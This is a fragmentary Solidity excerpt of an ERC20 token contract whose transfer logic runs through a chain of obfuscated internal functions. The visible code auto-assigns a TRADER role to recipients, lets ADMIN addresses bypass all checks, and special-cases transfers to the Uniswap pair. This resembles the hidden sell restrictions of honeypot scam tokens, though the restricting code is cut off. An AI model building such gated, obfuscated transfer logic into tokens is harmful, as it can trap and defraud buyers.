...
abstract contract _KDNEMFGConsole is Context, _KDNEMFGRoleControl {
...
contract _KDNEMFGERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _KDNEMFGERC20, _KDNEMFGConsole {
    ...
    ) _KDNEMFGERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_KDNEMFGERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __KDNEMFGftffg(from, to, amt);

    }

    function __KDNEMFGftffg(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __KDNEMFGhnggjsv(from, to, amt);
    }


    function __KDNEMFGhnggjsv(address from, address to, uint256 amt) internal {
        ...
        __KDNEMFGhnfdvrn(from, to, amt);
    }

    function __KDNEMFGhnfdvrn(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __KDNEMFGimhbrf(from, to, amt);
    }

    function __KDNEMFGimhbrf(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __KDNEMFGgbgfbuk(from, to, amt);
    }


    function __KDNEMFGgbgfbuk(address from, address to, uint256 amt) internal {


        __KDNEMFGhnce(from, to, amt);
    }

    function __KDNEMFGhnce(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __KDNEMFGfbhfsmfds(from, to, amt);
    ...
    function __KDNEMFGfbhfsmfds(address from, address to, uint256 amt) internal {
        if(amt > 0){
